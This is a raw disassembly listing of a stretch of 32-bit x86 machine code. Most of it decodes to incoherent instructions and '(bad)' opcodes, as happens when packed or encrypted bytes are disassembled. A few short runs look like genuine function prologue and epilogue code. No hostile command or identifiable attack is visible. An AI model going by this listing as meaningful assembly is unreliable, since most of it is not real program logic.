  40b60e:	ja     0x40b65a
  40b610:	imul   esp,DWORD PTR [ebp-0x6649460],0xffffffaa
  40b617:	fbld   TBYTE PTR [ebx]
  40b619:	das    
  40b61a:	sar    DWORD PTR [edi-0x2aa5bc23],cl
  40b620:	nop
  40b621:	es fdivr st(4),st
  40b624:	(bad)
  40b628:	ds mov esp,0x1987136
  40b62e:	cdq    
  40b62f:	push   cs
  40b630:	loop   0x40b608
  40b632:	gs jle 0x40b6af
  40b635:	or     DWORD PTR [edi+0x2e233ced],ecx
  40b63b:	in     eax,0xa1
  40b63d:	jno    0x40b5eb
  40b63f:	sbb    al,0x5a
  40b641:	clc    
  40b642:	adc    BYTE PTR [ebx-0x17],0x9a
  40b646:	or     eax,0x825bfa12
  40b64b:	push   eax
  40b64c:	out    0x3e,al
  40b64e:	imul   eax,DWORD PTR [ebp-0x1e],0xc95812a2
  40b655:	pop    ss
  40b656:	ffreep st(3)
  40b658:	add    eax,0xd512fc0b
  40b65d:	jb     0x40b67f
  40b65f:	jge    0x40b617
  40b661:	pop    ebx
  40b662:	aas    
  40b663:	loop   0x40b66e
  40b665:	cmp    eax,0x9608ed5d
  40b66a:	outs   dx,BYTE PTR ds:[esi]
  40b66b:	mov    eax,ds:0xfe075586
  40b670:	or     esp,DWORD PTR [ebx]
  40b672:	pop    ebx
  40b673:	sub    DWORD PTR [ebp+0x7ceb64bc],edi
  40b679:	push   0x7b
  40b67b:	cmp    dh,dl
  40b67d:	mov    eax,ds:0x92466ac5
  40b682:	adc    ch,BYTE PTR [ebp-0x75]
  40b685:	inc    eax
  40b686:	or     al,0x8b
  40b688:	or     ecx,ebp
  40b68a:	mov    bl,0x1
  40b68c:	add    BYTE PTR [eax],al
  40b68e:	frndint 
  40b690:	std    
  40b691:	imul   ebx,DWORD PTR [ebp+0x69],0xffffffe9
  40b695:	mov    ch,BYTE PTR [edi+edx*8-0x20]
  40b699:	xor    eax,DWORD PTR [esi-0x3]
  40b69c:	sub    eax,0x70f32a3c
  40b6a1:	jo     0x40b638
  40b6a3:	jg     0x40b715
  40b6a5:	jo     0x40b6b7
  40b6a7:	aaa    
  40b6a8:	xchg   ebx,eax
  40b6a9:	mov    bh,0x5c
  40b6ab:	push   cs
  40b6ac:	je     0x40b722
  40b6ae:	xor    BYTE PTR [ebx],al
  40b6b0:	rol    DWORD PTR [eax-0x27],1
  40b6b3:	push   0x51
  40b6b5:	sub    ch,dl
  40b6b7:	mov    ecx,0x9101449a
  40b6bc:	aas    
  40b6bd:	popf   
  40b6be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6bf:	mov    bl,0x6
  40b6c1:	pop    eax
  40b6c2:	sub    edi,DWORD PTR [edx-0x5c]
  40b6c5:	mov    cl,0xef
  40b6c7:	jne    0x40b689
  40b6c9:	xlat   BYTE PTR ds:[ebx]
  40b6ca:	test   eax,0xc94a963
  40b6cf:	add    eax,0xfeb7dda1
  40b6d4:	mov    BYTE PTR [edx],ah
  40b6d6:	arpl   di,dx
  40b6d8:	mov    ch,0x4f
  40b6da:	jne    0x40b6db
  40b6dc:	mov    edi,edx
  40b6de:	mov    ch,BYTE PTR [esi+0x2]
  40b6e1:	adc    ebp,DWORD PTR [ebx+0x433942d0]
  40b6e7:	push   es
  40b6e8:	data16 jle 0x40b766
  40b6eb:	dec    esp
  40b6ec:	in     al,dx
  40b6ed:	retf   
  40b6ee:	hlt    
  40b6ef:	imul   edi,DWORD PTR [esi+0x74],0x5b
  40b6f3:	stos   DWORD PTR es:[edi],eax
  40b6f4:	xchg   ecx,eax
  40b6f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6f6:	add    cl,BYTE PTR [ebx+0x7413572]
  40b6fc:	pop    ebx
  40b6fd:	adc    al,0x50
  40b6ff:	or     eax,0x6f83e523
  40b704:	pusha  
  40b705:	mov    eax,0xd9234fa1
  40b70a:	daa    
  40b70b:	(bad)  
  40b70c:	cld    
  40b70d:	push   ecx
  40b70e:	fld    QWORD PTR [edi]
  40b710:	cmp    dl,bl
  40b712:	add    BYTE PTR fs:[eax+0x7e],cl
  40b716:	ror    DWORD PTR [esi+0x4b],0xaa
  40b71a:	cld    
  40b71b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b71c:	pop    edx
  40b71d:	retf   
  40b71e:	ins    DWORD PTR es:[edi],dx
  40b71f:	xchg   ecx,eax
  40b720:	push   eax
  40b721:	mov    dl,0x4a
  40b723:	xchg   ecx,edx
  40b725:	cwde   
  40b726:	push   0xba5a2d4f
  40b72b:	push   ebx
  40b72d:	ins    DWORD PTR es:[edi],dx
  40b72e:	pop    esi
  40b72f:	inc    eax
  40b730:	jg     0x40b789
  40b732:	fisubr DWORD PTR [esi+edx*2]
  40b735:	repz jbe 0x40b6bb
  40b738:	iret   
  40b739:	mov    ds:0x2c80300,al
  40b73e:	sbb    ch,bh
  40b740:	jno    0x40b748
  40b742:	jnp    0x40b723
  40b744:	push   edi
  40b745:	xsaveopt fs:[eax]
  40b749:	jecxz  0x40b7bf
  40b74b:	scas   eax,DWORD PTR es:[edi]
  40b74c:	sub    eax,0x12248b12
  40b751:	arpl   bp,sp
  40b753:	jmp    DWORD PTR [eax+0x12]
  40b756:	(bad)  
  40b757:	in     al,dx
  40b758:	(bad)  
  40b759:	push   cs
  40b75a:	mov    BYTE PTR [ebp-0x743dfb41],ch
  40b760:	mov    bh,ah
  40b762:	lds    ebx,FWORD PTR ds:0xc1ddc127
  40b768:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b769:	leave  
  40b76a:	mov    edi,0x65b0896d
  40b76f:	mov    ebx,0x3b59a3fd
  40b774:	int3   
  40b775:	lds    eax,FWORD PTR [ecx+0x7a]
  40b778:	data16 mov cl,0xe2
  40b77b:	jp     0x40b7aa
  40b77d:	pop    esp
  40b77e:	sahf   
  40b77f:	inc    ebp
  40b780:	stos   BYTE PTR es:[edi],al
  40b781:	sub    bh,cl
  40b783:	test   DWORD PTR [edi+0x44],0x84755560
  40b78a:	add    eax,0x5c1ba00f
  40b78f:	mov    DWORD PTR [ecx],ebp
  40b791:	lea    edi,[eax]
  40b793:	push   cs
  40b794:	jnp    0x40b791
  40b796:	xchg   edi,eax
  40b797:	jg     0x40b80a
  40b799:	jnp    0x40b7b1
  40b79b:	imul   esi,edx,0x79
  40b79e:	aam    0x8f
  40b7a0:	pop    ebp
  40b7a1:	fisttp WORD PTR [edx]
  40b7a3:	dec    ebp
  40b7a4:	out    dx,eax
  40b7a5:	inc    edx
  40b7a6:	xor    al,0xf0
  40b7a8:	leave  
  40b7a9:	out    dx,al
  40b7aa:	retf   
  40b7ab:	jnp    0x40b7dc
  40b7ad:	add    BYTE PTR [ebx-0x673a40e8],bl
  40b7b3:	and    DWORD PTR [ecx+0xb0889e5],0xeafcfa92
  40b7bd:	push   0x31
  40b7bf:	(bad)  
  40b7c0:	and    BYTE PTR [eax-0x4d15d3e8],bl
  40b7c6:	int3   
  40b7c7:	pop    ebx
  40b7c8:	or     ch,BYTE PTR [ebp+ecx*4-0x3a]
  40b7cc:	or     esp,ecx
  40b7ce:	cmp    eax,0x9ff94d77
  40b7d3:	mov    ah,0x64
  40b7d5:	scas   al,BYTE PTR es:[edi]
  40b7d6:	in     al,dx
  40b7d7:	sub    DWORD PTR [edi+edx*4-0xb8c854c],edx
  40b7de:	aas    
  40b7df:	jmp    0x1882:0x39fa
  40b7e5:	jno    0x40b7fd
  40b7e7:	add    eax,0x7f58b443
  40b7ec:	cmp    DWORD PTR [ebx+0x28],esp
  40b7ef:	das    
  40b7f0:	ds (bad) 
  40b7f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7f3:	adc    al,0x11
  40b7f5:	es call 0x9322880f
  40b7fb:	lahf   
  40b7fc:	rcl    DWORD PTR [edi+0x8],0xa1
  40b800:	pop    ebx
  40b801:	push   cs
  40b802:	jle    0x40b82e
  40b804:	xchg   esi,eax
  40b805:	mov    ecx,0xaf4e82d1
  40b80a:	sbb    BYTE PTR [ecx-0x45],cl
  40b80d:	mov    esi,0x21dc2814
  40b812:	add    DWORD PTR [ecx+eax*2],ebx
  40b815:	or     bh,BYTE PTR [esi]
  40b817:	jl     0x40b7b5
  40b819:	add    eax,0xe2e803aa
  40b81e:	pop    ebx
  40b81f:	mov    esp,0xf8d9c3bb
  40b824:	std    
  40b825:	nop
  40b826:	and    al,0xae
  40b828:	inc    esp
  40b829:	cmp    dl,ah
  40b82b:	sti    
  40b82c:	sub    BYTE PTR [esp+edi*2],ah
  40b82f:	loope  0x40b891
  40b831:	xchg   cl,ch
  40b833:	gs scas al,BYTE PTR es:[edi]
  40b835:	mov    ebx,0xe3c654a8
  40b83a:	cmp    eax,0x859514f1
  40b83f:	mov    ah,0x8f
  40b841:	mov    al,BYTE PTR [eax+ecx*1]
  40b844:	add    al,0x37
  40b846:	jmp    0x40b9fe
  40b84b:	hlt    
  40b84c:	sbb    eax,0x71518348
  40b851:	rep ins DWORD PTR es:[edi],dx
  40b853:	cmp    BYTE PTR [esp+ecx*2],al
  40b856:	aaa    
  40b857:	jnp    0x40b8ce
  40b859:	lahf   
  40b85a:	sbb    DWORD PTR [edi-0xe],ecx
  40b85d:	jo     0x40b8cf
  40b85f:	xchg   ebp,eax
  40b860:	jg     0x40b8d2
  40b862:	jo     0x40b8b1
  40b864:	mov    BYTE PTR [esi],0x90
  40b867:	stos   DWORD PTR es:[edi],eax
  40b868:	imul   esp,DWORD PTR [edi-0x3b],0x29
  40b86c:	or     BYTE PTR [ecx],cl
  40b86e:	adc    BYTE PTR [edi-0x76b66eb7],dl
  40b874:	loopne 0x40b8a6
  40b876:	lahf   
  40b877:	pop    esp
  40b878:	and    dl,BYTE PTR [ebx-0x339af2e1]
  40b87e:	mov    ebx,0xd39e1205
  40b883:	mov    edi,0x9d99e28
  40b888:	push   cs
  40b889:	jbe    0x40b80f
  40b88b:	dec    edx
  40b88c:	mov    ebx,0x224f4f78
  40b891:	pop    eax
  40b892:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b893:	and    ebx,ecx
  40b895:	enter  0x6b5d,0x9
  40b899:	out    0x97,eax
  40b89b:	sbb    BYTE PTR [edi+0x34],ah
  40b89e:	into   
  40b89f:	rcl    BYTE PTR [edx+eiz*2-0x3fb97089],0x5b
  40b8a7:	sbb    eax,0xc9b6ce2c
  40b8ac:	inc    eax
  40b8ad:	sub    bl,dl
  40b8af:	ja     0x40b8d2
  40b8b1:	and    eax,0x9714355f
  40b8b6:	sbb    ah,BYTE PTR [eax]
  40b8b8:	xor    al,0x3c
  40b8bb:	xor    ch,BYTE PTR [esi+0x4ea8bd9d]
  40b8c1:	inc    DWORD PTR ds:0xdfbeb0f4
  40b8c7:	test   al,0xdb
  40b8c9:	test   BYTE PTR [eax+0x5d00c174],ch
  40b8cf:	or     edi,DWORD PTR [ecx]
  40b8d1:	xchg   BYTE PTR [ecx+0x9bca35e],cl
  40b8d7:	out    dx,eax
  40b8d8:	ss mov ah,0x68
  40b8db:	sar    BYTE PTR [edx+0x1d],cl
  40b8de:	test   DWORD PTR [ecx-0x74],edx
  40b8e1:	mov    al,0x69
  40b8e3:	sub    BYTE PTR [esi+0x7f4f59b7],al
  40b8e9:	jo     0x40b936
  40b8eb:	mov    edi,0x4a42d9d9
  40b8f0:	jno    0x40b8b0
  40b8f2:	cmp    bh,cl
  40b8f4:	fucomi st,st(6)
  40b8f6:	aad    0xdb
  40b8f8:	scas   al,BYTE PTR es:[edi]
  40b8f9:	pop    es
  40b8fa:	xchg   edi,eax
  40b8fb:	in     eax,0x2c
  40b8fd:	repz loopne 0x40b8e3
  40b900:	add    ch,bh
  40b902:	lock jno 0x40b8bf
  40b905:	push   0x4d01061a
  40b90a:	imul   edi,esp,0xffffffdb
  40b90d:	sub    al,0x0
  40b90f:	ja     0x40b931
  40b911:	add    BYTE PTR [ebx+0x145f5a52],al
  40b917:	addr16 enter 0xe02c,0x90
  40b91c:	pushf  
  40b91d:	mov    DWORD PTR [ecx+0x17],ecx
  40b920:	and    al,BYTE PTR [esi]
  40b922:	lea    ecx,[ecx]
  40b924:	cld    
  40b925:	mov    esi,0xeb338d85
  40b92a:	icebp  
  40b92b:	jae    0x40b946
  40b92d:	xor    ebx,edi
  40b92f:	sahf   
  40b930:	(bad)  
  40b931:	mov    ebp,0x3d3fa3c9
  40b936:	imul   eax,DWORD PTR [ecx-0x22],0x5b1ecea7
  40b93d:	lods   al,BYTE PTR ds:[esi]
  40b93e:	mov    edx,0x7b801d54
  40b943:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b944:	fild   QWORD PTR [ecx]
  40b946:	jecxz  0x40b8d2
  40b948:	ds pop ss
  40b94a:	inc    edi
  40b94b:	loope  0x40b98d
  40b94d:	mov    dl,0xfc
  40b94f:	ja     0x40b94c
  40b951:	popa   
  40b952:	xchg   edx,eax
  40b953:	inc    ebx
  40b954:	shr    BYTE PTR [esi+esi*4+0x68],1
  40b958:	xor    ebp,DWORD PTR [eax-0x3a849681]
  40b95e:	xor    edi,DWORD PTR [esp+ecx*4-0x125d7903]
  40b965:	jae    0x40b9dc
  40b967:	mov    esp,0xb692bd75
  40b96c:	iret   
  40b96d:	rol    BYTE PTR [eax+0x3c],1
  40b970:	or     BYTE PTR [ebp+0xc7551b0],0xf
  40b977:	inc    edx
  40b978:	jno    0x40b914
  40b97a:	ror    BYTE PTR [esi-0x26],0xea
  40b97e:	push   0xfc785f8e
  40b983:	in     eax,dx
  40b984:	push   ds
  40b985:	push   ebp
  40b986:	jnp    0x40b92c
  40b988:	int    0xd
  40b98a:	mov    bh,0xf
  40b98c:	and    BYTE PTR [edi],0x9a
  40b98f:	and    DWORD PTR gs:[ecx*4-0x389db523],eax
  40b997:	mov    dl,0xe6
  40b999:	rol    DWORD PTR [esi-0x611b17b1],1
  40b99f:	ja     0x40b9b9
  40b9a1:	shr    dh,0xae
  40b9a4:	hlt    
  40b9a5:	mov    ebp,0x1a9d5c00
  40b9aa:	mov    ds:0x15d0b43c,eax
  40b9af:	(bad)
  40b9b2:	adc    esp,DWORD PTR [ebp-0x294da9d0]
  40b9b8:	sbb    BYTE PTR [ecx],al
  40b9ba:	(bad)  
  40b9bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9bc:	cli    
  40b9bd:	cdq    
  40b9be:	cli    
  40b9bf:	adc    dh,ch
  40b9c1:	lods   al,BYTE PTR ds:[esi]
  40b9c2:	ins    DWORD PTR es:[edi],dx
  40b9c3:	dec    ebx
  40b9c4:	and    dh,BYTE PTR ds:0xf841dfe
  40b9ca:	mov    edi,0x3d126baf
  40b9cf:	xor    esp,DWORD PTR [ebx-0x448c9fd8]
  40b9d5:	bound  esi,QWORD PTR [ecx]
  40b9d7:	aam    0x22
  40b9d9:	mov    al,0xd4
  40b9db:	push   ebp
  40b9dc:	dec    ebx
  40b9dd:	aas    
  40b9de:	mov    WORD PTR [ebx],ss
  40b9e0:	sbb    ah,bh
  40b9e2:	sub    eax,0xfc79dca6
  40b9e7:	mov    WORD PTR [esi+0x64f7508c],fs
  40b9ed:	pop    esp
  40b9ee:	jmp    0xf571:0x5baf529c
  40b9f5:	mov    ebx,0x6ff32479
  40b9fa:	pop    edi
  40b9fb:	mov    ds:0x4734f317,eax
  40ba00:	cmp    al,0xc5
  40ba02:	je     0x40ba19
  40ba08:	mov    eax,DWORD PTR [ebp+0x8]
  40ba0b:	mov    ecx,DWORD PTR [ebp-0x8]
  40ba0e:	xor    eax,esi
  40ba10:	add    eax,edi
  40ba12:	mov    DWORD PTR [ecx],eax
  40ba14:	jmp    0x40bbf5
  40ba19:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40ba20:	jmp    0x40bbf5
  40ba25:	mov    eax,DWORD PTR [ebp-0x8]
  40ba28:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ba2b:	mov    ecx,DWORD PTR [ecx]
  40ba2d:	mov    DWORD PTR [eax],ecx
  40ba2f:	mov    eax,DWORD PTR [ebp+0xc]
  40ba32:	jmp    0x40bbea
  40ba37:	retf   
  40ba38:	(bad)  [ebx+0x5171a9c1]
  40ba3e:	icebp  
  40ba3f:	dec    eax
  40ba40:	cmp    eax,0x123a0d6b
  40ba45:	dec    ebx
  40ba46:	inc    ebx
  40ba47:	in     al,0xf0
  40ba49:	jo     0x40babb
  40ba4b:	xchg   ebp,eax
  40ba4c:	jg     0x40babe
  40ba4e:	jo     0x40baa6
  40ba50:	pop    ebp
  40ba51:	mov    ds:0x13f5515b,al
  40ba56:	pop    DWORD PTR [edi]
  40ba58:	repnz stc 
  40ba5a:	repnz xchg esi,eax
  40ba5c:	inc    ecx
  40ba5d:	jne    0x40ba1f
  40ba5f:	bound  esp,QWORD PTR [ecx-0x85559f2]
  40ba65:	mov    esi,0x656206ce
  40ba6a:	in     al,dx
  40ba6b:	or     ebp,DWORD PTR ds:0x2ce2f9e3
  40ba71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba72:	push   ecx
  40ba73:	iret   
  40ba74:	dec    BYTE PTR [eax+0x6cd9ee72]
  40ba7a:	or     al,0xa1
  40ba7c:	addr16 test al,0xfc
  40ba7f:	js     0x40ba3e
  40ba81:	scas   al,BYTE PTR es:[edi]
  40ba82:	call   0x77e83d3f
  40ba87:	inc    ecx
  40ba88:	test   BYTE PTR [edx+0x2a5d476d],al
  40ba8e:	shr    BYTE PTR [ebx+0x54030ccf],cl
  40ba94:	cwde   
  40ba95:	outs   dx,DWORD PTR ds:[esi]
  40ba96:	dec    ebx
  40ba97:	(bad)  
  40ba98:	out    dx,eax
  40ba99:	call   0xc0de32ae
  40ba9e:	xchg   edi,eax
  40ba9f:	fcomp  st(2)
  40baa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40baa2:	jmp    0x40ba9a
  40baa4:	mov    edx,0x10e82a33
  40baa9:	mov    ebx,0xd2a094c2
  40baae:	and    al,0xd9
  40bab0:	mov    ds:0x18c2389b,al
  40bab5:	jae    0x40ba90
  40bab7:	xchg   ebp,eax
  40bab8:	and    BYTE PTR [edi+0x10aefd99],0x71
  40babf:	clc    
  40bac0:	mov    eax,0x56efedd5
  40bac5:	inc    esi
  40bac6:	sbb    al,0xa9
  40bac8:	int3   
  40bac9:	xor    eax,DWORD PTR [edi]
  40bacb:	jmp    0x39e8:0x5d12c0fe
  40bad2:	retf   
  40bad3:	div    DWORD PTR [edx+eax*2]
  40bad6:	or     DWORD PTR [ecx+0x2ffdbe8],edx
  40badc:	aas    
  40badd:	push   edi
  40bade:	test   eax,0x2ffa6d16
  40bae3:	(bad)  
  40bae4:	fs xchg esi,eax
  40bae6:	dec    esp
  40bae7:	aad    0x67
  40bae9:	out    0xb8,al
  40baeb:	pop    edi
  40baec:	dec    esp
  40baed:	sbb    dh,bl
  40baef:	ds mov dh,0xe5
  40baf2:	cli    
  40baf3:	fwait
  40baf4:	(bad)  
  40baf5:	repnz push 0xffffffbf
  40baf8:	jecxz  0x40bb18
  40bafa:	pop    es
  40bafb:	and    esi,DWORD PTR [ecx-0x69]
  40bafe:	rol    dh,0xcb
  40bb01:	add    DWORD PTR [ecx],edi
  40bb03:	sub    eax,0x3cde2503
  40bb08:	push   DWORD PTR [ecx-0x51731b37]
  40bb0e:	dec    esp
  40bb0f:	sahf   
  40bb10:	scas   eax,DWORD PTR es:[edi]
  40bb11:	sar    BYTE PTR [esi-0x7f62e176],0xed
  40bb18:	addr16 cmp cl,cl
  40bb1b:	test   al,0xa
  40bb1d:	cwde   
  40bb1e:	jmp    0x4d4a:0x1556e12f
  40bb25:	mov    ebp,0xe6b2d88c
  40bb2a:	or     DWORD PTR [edx],esi
  40bb2c:	add    ah,BYTE PTR ds:0xb216902f
  40bb32:	js     0x40bb18
  40bb34:	xchg   DWORD PTR [ebx+0x23],edi
  40bb37:	mov    ebx,0xff0ffd05
  40bb3c:	fimul  DWORD PTR [edx]
  40bb3e:	mov    eax,edi
  40bb40:	jl     0x40bb3a
  40bb42:	jno    0x40bb8b
  40bb44:	cmp    dh,cl
  40bb46:	leave  
  40bb47:	imul   edx,DWORD PTR [ebx-0x1940c4ac],0xffffffcf
  40bb4e:	fld    TBYTE PTR ds:0x12e31b80
  40bb54:	ins    DWORD PTR es:[edi],dx
  40bb55:	sub    eax,0xfbcc0183
  40bb5a:	leave  
  40bb5b:	adc    eax,0x2b908d03
  40bb60:	leave  
  40bb61:	mov    al,0x8c
  40bb63:	das    
  40bb64:	std    
  40bb65:	jae    0x40bbc5
  40bb67:	retf   0xeee7
  40bb6a:	sub    edi,0xfffffff6
  40bb6d:	data16 cmp cl,BYTE PTR [ebp-0x2c]
  40bb71:	mov    ecx,0xa6747e6
  40bb76:	push   cs
  40bb77:	dec    esi
  40bb78:	call   0xa15a7b52
  40bb7d:	sahf   
  40bb7e:	scas   eax,DWORD PTR es:[edi]
  40bb7f:	or     al,0x5f
  40bb81:	or     dl,dh
  40bb83:	(bad)  
  40bb84:	jg     0x40bbea
  40bb86:	outs   dx,DWORD PTR ds:[esi]
  40bb87:	mul    DWORD PTR [edi+0x714e568]
  40bb8d:	sbb    al,0x64
  40bb8f:	or     al,0x84
  40bb91:	pop    ebx
  40bb92:	cwde   
  40bb93:	xor    al,0xdf
  40bb95:	xchg   esi,eax
  40bb96:	fnstsw WORD PTR [eax+0x78cdfa39]
  40bb9c:	retf   0x4c0e
  40bb9f:	or     eax,0xa28b9e6c
  40bba4:	fsubr  st,st(3)
  40bba6:	(bad)  
  40bba8:	adc    eax,0x3a787aa
  40bbad:	and    al,0x3c
  40bbaf:	dec    eax
  40bbb0:	in     eax,0xa
  40bbb2:	mov    BYTE PTR [ecx+esi*4],bh
  40bbb5:	adc    al,0x47
  40bbb7:	add    cl,0x63
  40bbba:	mov    ds:0xc6760ff7,al
  40bbbf:	pop    ds
  40bbc0:	fwait
  40bbc1:	lods   al,BYTE PTR ds:[esi]
  40bbc2:	in     eax,dx
  40bbc3:	rcl    DWORD PTR [edi+0x5b],1
  40bbc6:	dec    ebx
  40bbc7:	sbb    ebx,DWORD PTR [ebx+edx*4-0xa]
  40bbcb:	(bad)  
  40bbcc:	cli    
  40bbcd:	push   eax
  40bbce:	jge    0x40bb85
  40bbd0:	(bad)  
  40bbd1:	sbb    al,0x7d
  40bbd3:	neg    BYTE PTR [eax]
  40bbd5:	cli    
  40bbd6:	(bad)  
  40bbd7:	dec    eax
  40bbd8:	mov    al,ds:0x4ffe16cd
  40bbdd:	sub    eax,0xfa0a3d3b
  40bbe2:	je     0x40bbe5
  40bbe4:	lods   eax,DWORD PTR ds:[esi]
  40bbe5:	pop    ebx
  40bbe6:	jp     0x40bc4e
  40bbe8:	aam    0x7d
  40bbea:	mov    eax,DWORD PTR [ebp+0x8]
  40bbed:	push   DWORD PTR [ebp-0x8]
  40bbf0:	call   0x401000
  40bbf5:	mov    eax,DWORD PTR [ebp-0xc]
  40bbf8:	cmp    eax,ebx
  40bbfa:	je     0x40acdc
  40bc00:	mov    eax,DWORD PTR [ebp-0x8]
  40bc03:	mov    eax,DWORD PTR [eax]
  40bc05:	pop    edi
  40bc06:	pop    esi
  40bc07:	pop    ebx
  40bc08:	leave  
  40bc09:	ret    0x8
  40bc0c:	push   ebp
  40bc0d:	mov    ebp,esp
  40bc0f:	push   ecx
  40bc10:	sbb    DWORD PTR ds:0x43441a,ecx
  40bc16:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40bc1d:	sbb    eax,DWORD PTR ds:0x434412
  40bc23:	mov    eax,DWORD PTR [ebp+0x8]
  40bc26:	or     DWORD PTR ds:0x434495,0x432e3e
  40bc30:	jmp    0x40be4b
  40bc35:	push   es
  40bc36:	mov    ch,dl
  40bc38:	xor    al,0x72
  40bc3a:	je     0x40bc02
  40bc3c:	stos   BYTE PTR es:[edi],al
  40bc3d:	aas    
  40bc3e:	lods   al,BYTE PTR ds:[esi]
  40bc3f:	and    DWORD PTR [eax-0x644d93d],edi
  40bc45:	jns    0x40bc45
  40bc47:	jo     0x40bcb9
  40bc49:	jb     0x40bcca
  40bc4b:	jo     0x40bcbd
  40bc4d:	pop    ebp
  40bc4e:	push   edx
  40bc4f:	mov    ebx,DWORD PTR [ebx]
  40bc51:	pop    edi
  40bc52:	lahf   
  40bc53:	jnp    0x40bbff
  40bc55:	add    DWORD PTR [edx+0x63],eax
  40bc58:	inc    ecx
  40bc59:	outs   dx,BYTE PTR gs:[esi]
  40bc5b:	pop    edx
  40bc5c:	in     al,dx
  40bc5d:	cmp    eax,0x930459ed
  40bc62:	dec    edi
  40bc63:	in     al,0x4e
  40bc65:	push   esi
  40bc66:	fmul   DWORD PTR [ecx+0x5f]
  40bc69:	aad    0xe3
  40bc6b:	xor    DWORD PTR [ebx-0x78],esi
  40bc6e:	mov    dh,0x4c
  40bc70:	xchg   eax,eax
  40bc72:	repnz add ebx,ecx
  40bc75:	pop    ss
  40bc76:	jno    0x40bc97
  40bc78:	stc    
  40bc79:	add    ecx,DWORD PTR [edi+ebx*8]
  40bc7c:	cmp    eax,DWORD PTR [ecx+0x3f]
  40bc7f:	lahf   
  40bc80:	mov    DWORD PTR [ebx],edx
  40bc82:	dec    edi
  40bc83:	loopne 0x40bc23
  40bc85:	and    dl,bh
  40bc87:	mov    bh,0x4f
  40bc89:	call   DWORD PTR [eax+0x43ca6c64]
  40bc8f:	dec    eax
  40bc90:	xchg   ebp,eax
  40bc92:	jne    0x40bcb5
  40bc94:	pop    ds
  40bc95:	out    dx,eax
  40bc96:	push   es
  40bc97:	cdq    
  40bc98:	mov    dl,0x74
  40bc9a:	adc    DWORD PTR [eax-0x76],eax
  40bc9d:	das    
  40bc9e:	mov    ds:0xa77ced00,al
  40bca3:	jns    0x40bc8b
  40bca5:	inc    edi
  40bca6:	iret   
  40bca7:	lock js 0x40bd21
  40bcaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcab:	xlat   BYTE PTR ds:[ebx]
  40bcac:	(bad)  
  40bcad:	mov    eax,ds:0xf09629cd
  40bcb2:	lea    esp,[edi-0x7987411b]
  40bcb8:	jmp    DWORD PTR [ecx]
  40bcba:	inc    edi
  40bcbb:	retf   
  40bcbc:	stc    
  40bcbd:	xchg   edx,eax
  40bcbe:	mov    ch,0x1c
  40bcc0:	dec    ecx
  40bcc1:	fwait
  40bcc2:	outs   dx,BYTE PTR ds:[esi]
  40bcc3:	push   es
  40bcc4:	fdiv   DWORD PTR [eax+0x708d6a4]
  40bcca:	lea    eax,[edx+0x5b]
  40bccd:	cmp    ah,BYTE PTR [edx-0x9382c0f]
  40bcd3:	dec    esp
  40bcd4:	les    ebp,FWORD PTR [esi]
  40bcd6:	sbb    BYTE PTR [edi+0x6dade483],0x80
  40bcdd:	and    bl,ch
  40bcdf:	test   eax,0x5cc21992
  40bce4:	pop    es
  40bce5:	push   esi
  40bce6:	or     esp,0xacae9661
  40bcec:	push   ebp
  40bced:	vpmaxsb ymm5{k5},ymm0,YMMWORD PTR [ebp+0xe20]
  40bcf4:	daa    
  40bcf5:	xchg   edx,eax
  40bcf6:	mov    al,ds:0xb5d6ae15
  40bcfb:	rol    BYTE PTR [edi],1
  40bcfd:	and    eax,0x2b49d0a9
  40bd02:	xchg   esi,eax
  40bd03:	fbld   TBYTE PTR [eax]
  40bd05:	and    dh,ah
  40bd07:	jmp    0x40bd0c
  40bd09:	xlat   BYTE PTR ds:[ebx]
  40bd0a:	nop
  40bd0b:	or     al,0xa4
  40bd0d:	(bad)  
  40bd0e:	cwde   
  40bd0f:	dec    edx
  40bd10:	ja     0x40bd77
  40bd12:	aad    0xc1
  40bd14:	(bad)  
  40bd15:	pop    ebp
  40bd16:	jecxz  0x40bd7c
  40bd18:	das    
  40bd19:	ins    BYTE PTR es:[edi],dx
  40bd1a:	add    eax,DWORD PTR [esi+0x6d]
  40bd1d:	mov    ebp,0xe49a1789
  40bd22:	imul   DWORD PTR [ebp*8-0x218f2f91]
  40bd29:	jl     0x40bd11
  40bd2b:	dec    esi
  40bd2c:	shl    BYTE PTR [ebx+eiz*1],1
  40bd2f:	lods   al,BYTE PTR ds:[esi]
  40bd30:	aam    0xb7
  40bd32:	add    BYTE PTR [edx-0xe851b3b],bl
  40bd38:	mov    ch,0x37
  40bd3a:	inc    esi
  40bd3b:	out    dx,eax
  40bd3c:	in     eax,dx
  40bd3d:	xor    cl,al
  40bd3f:	xchg   esi,eax
  40bd40:	jge    0x40bd2e
  40bd42:	retf   0xe4d0
  40bd45:	sahf   
  40bd46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd47:	sub    ebp,DWORD PTR [edi-0x61d8a570]
  40bd4d:	dec    eax
  40bd4e:	or     DWORD PTR [edx-0x4],0xffffffc1
  40bd52:	mov    esp,0xe19d552e
  40bd57:	gs scas al,BYTE PTR es:[edi]
  40bd59:	(bad)  
  40bd5a:	lods   al,BYTE PTR ds:[esi]
  40bd5b:	std    
  40bd5c:	push   0xffffffb0
  40bd5e:	jns    0x40bdd8
  40bd60:	mov    BYTE PTR [ecx+0x5152bf7e],ch
  40bd66:	sbb    eax,0xc479b908
  40bd6b:	xor    esp,DWORD PTR [ebx+ebp*2+0x5a6c48de]
  40bd72:	sar    BYTE PTR [edi-0x35],0x2d
  40bd76:	ret    0x11c8
  40bd79:	arpl   dx,bx
  40bd7b:	out    0x9d,eax
  40bd7d:	and    BYTE PTR [ecx+0x502ce336],bh
  40bd83:	bound  ebp,QWORD PTR [esi-0x4aa43881]
  40bd89:	push   ds
  40bd8a:	mov    ds:0x8cbc629,al
